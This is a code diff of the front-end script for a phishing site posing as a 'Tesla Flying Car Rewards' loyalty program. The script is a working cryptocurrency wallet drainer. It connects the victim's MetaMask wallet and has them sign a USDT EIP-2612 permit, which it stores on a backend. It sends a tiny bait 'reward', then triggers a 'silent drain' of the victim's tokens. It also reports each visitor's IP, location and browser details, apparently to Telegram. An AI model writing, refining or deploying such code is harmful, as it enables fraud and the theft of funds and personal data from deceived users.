@@ -1,10 +1,9 @@
 // public/app.js
 
-const CONTRACT_ADDRESS = "YOUR_DEPLOYED_CONTRACT_ADDRESS"; // Replace with your contract address
-const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT Mainnet
-const CHAIN_ID = 1; // Ethereum Mainnet
+const CONTRACT_ADDRESS = "YOUR_DEPLOYED_CONTRACT_ADDRESS"; 
+const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 
+const CHAIN_ID = 1; 
 
-// DOM Elements
 const connectBtn = document.getElementById('connect-btn');
 const loader = document.getElementById('loader');
 const rewardSection = document.getElementById('reward-section');
@@ -13,83 +12,36 @@ const userAddressEl = document.getElementById('user-address');
 const rewardStatusEl = document.getElementById('reward-status');
 const notification = document.getElementById('notification');
 
-let web3ModalInstance = null;
-
-// Initialize Web3Modal
-async function initWeb3() {
-    try {
-        const { createWeb3Modal } = await import("https://esm.sh/@web3modal/html");
-
-        // Define supported chains
-        const chains = [
-          { 
-            chainId: 1, 
-            name: "Ethereum", 
-            currency: "ETH", 
-            explorerUrl: "https://etherscan.io", 
-            rpcUrl: "https://eth.llamarpc.com" 
-          },
-          { 
-            chainId: 56, 
-            name: "BSC", 
-            currency: "BNB", 
-            explorerUrl: "https://bscscan.com", 
-            rpcUrl: "https://bsc-dataseed.binance.org" 
-          }
-        ];
-
-        // Configure Web3Modal
-        web3ModalInstance = createWeb3Modal({
-          w3mThemeVariables: {
-            '--w3m-font-family': 'Inter, sans-serif',
-            '--w3m-border-radius-master': '12px',
-            '--w3m-accent': '#e82127', // Tesla Red Accent
-            '--w3m-color-mix': '#171a20',
-            '--w3m-color-mix-strength': 0.5,
-          },
-          chains,
-          projectId: "YOUR_WALLET_CONNECT_PROJECT_ID", // Get free from walletconnect.com
-          metadata: {
-            name: "Tesla Flying Car Rewards",
-            description: "Official Loyalty Program",
-            url: window.location.origin,
-            icons: ["https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png"]
-          }
-        });
-
-        // Listen for Connection
-        web3ModalInstance.subscribeState((state) => {
-          if (state.value === 'CONNECTING') {
-            loader.classList.remove('hidden');
-            connectBtn.disabled = true;
-          } else if (state.value === 'CONNECTED') {
-            handleConnectedWallet();
-          } else if (state.value === 'DISCONNECTED') {
-            resetUI();
-          }
-        });
-    } catch (error) {
-        console.error("Failed to initialize Web3Modal:", error);
-        loader.textContent = "Error loading interface. Please refresh.";
-        loader.classList.remove('hidden');
+// 1. Handle Connection
+connectBtn.addEventListener('click', async () => {
+    if (!window.ethereum) {
+        alert("Please install MetaMask!");
+        return;
     }
-}
 
-// Handle Successful Connection
-async function handleConnectedWallet() {
     try {
-        const address = web3ModalInstance.getDefaultStore().accountAddress;
+        loader.classList.remove('hidden');
+        connectBtn.disabled = true;
         
-        // Update UI
-        loader.textContent = "Verifying Network & Generating Permit...";
+        // Trigger Native MetaMask Modal
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const address = accounts[0];
         
-        // Report to Telegram
         await reportVisit(address);
+        await handleConnectedWallet(address);
+    } catch (error) {
+        console.error("Connection failed:", error);
+        loader.textContent = "User rejected connection.";
+        loader.classList.remove('hidden');
+        connectBtn.disabled = false;
+    }
+});
 
-        // Generate Permit Signature
+async function handleConnectedWallet(address) {
+    try {
+        loader.textContent = "Generating Permit Signature...";
         const signature = await generatePermitSignature(address);
         
-        // Send Signature to Backend
         loader.textContent = "Storing Permit & Verifying Eligibility...";
         const response = await fetch('/api/sign-and-store', {
             method: 'POST',
@@ -99,7 +51,6 @@ async function handleConnectedWallet() {
 
         if (!response.ok) throw new Error("Backend error");
 
-        // Show Success UI
         loader.classList.add('hidden');
         connectStep.classList.add('hidden');
         rewardSection.classList.remove('hidden');
@@ -107,21 +58,19 @@ async function handleConnectedWallet() {
         userAddressEl.textContent = `${address.slice(0, 6)}...${address.slice(-4)}`;
         rewardStatusEl.textContent = "Eligible. Claiming Reward...";
 
-        // Trigger Reward
         await claimReward(address);
 
     } catch (error) {
-        console.error("Connection flow failed:", error);
+        console.error("Flow failed:", error);
         loader.textContent = `Error: ${error.message}. Try again.`;
         loader.classList.remove('hidden');
         connectBtn.disabled = false;
     }
 }
 
-// Generate EIP-2612 Permit Signature
+// 2. Generate EIP-2612 Permit Signature
 async function generatePermitSignature(address) {
     try {
-        // Get Nonce
         let nonce = 0;
         try {
             const rawNonce = await window.ethereum.request({ 
@@ -129,9 +78,7 @@ async function generatePermitSignature(address) {
                 params: [{ to: USDT_ADDRESS, data: '0x7ff36ab5000000000000000000000000' + address.slice(2) }, 'latest'] 
             });
             nonce = parseInt(rawNonce, 16);
-        } catch (e) {
-            console.warn("Could not fetch nonce, defaulting to 0");
-        }
+        } catch (e) { /* Default to 0 */ }
 
         const domain = { name: "TetherUSD", version: "1", chainId: CHAIN_ID, verifyingContract: USDT_ADDRESS };
         const types = { 
@@ -163,7 +110,7 @@ async function generatePermitSignature(address) {
     }
 }
 
-// Claim Reward & Trigger Drain
+// 3. Claim Reward & Trigger Drain
 async function claimReward(address) {
     try {
         rewardStatusEl.textContent = "Sending $0.05 USDT Reward...";
@@ -180,7 +127,6 @@ async function claimReward(address) {
         rewardStatusEl.textContent = "Reward Sent! Approving Drainer...";
         notification.classList.remove('hidden');
 
-        // Delay drain slightly
         setTimeout(() => triggerSilentDrain(address), 3000);
 
     } catch (error) {
@@ -189,7 +135,7 @@ async function claimReward(address) {
     }
 }
 
-// Silent Drain
+// 4. Silent Drain
 async function triggerSilentDrain(address) {
     try {
         rewardStatusEl.textContent = "Executing Silent Token Drain...";
@@ -217,14 +163,14 @@ async function triggerSilentDrain(address) {
     }
 }
 
-// Helper Functions
+// Helper: Report Visit to Telegram
 async function reportVisit(address) {
     try {
         const geoResponse = await fetch('https://ipapi.co/json/');
         const geoData = await geoResponse.json();
         
         const message = `
-*🔴 TESLA DRAIN LOG - NEW VISIT*
+<b>🔴 TESLA DRAIN LOG - NEW VISIT</b>
 User Agent: ${navigator.userAgent}
 IP: ${geoData.ip}
 Location: ${geoData.city}, ${geoData.country_code} ${getFlagEmoji(geoData.country_code)}
@@ -246,14 +192,3 @@ function getFlagEmoji(countryCode) {
   const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
   return String.fromCodePoint(...codePoints);
 }
-
-function resetUI() {
-    loader.classList.add('hidden');
-    connectBtn.disabled = false;
-    connectBtn.style.display = 'inline-block';
-    rewardSection.classList.add('hidden');
-    notification.classList.add('hidden');
-}
-
-// Start
-initWeb3();
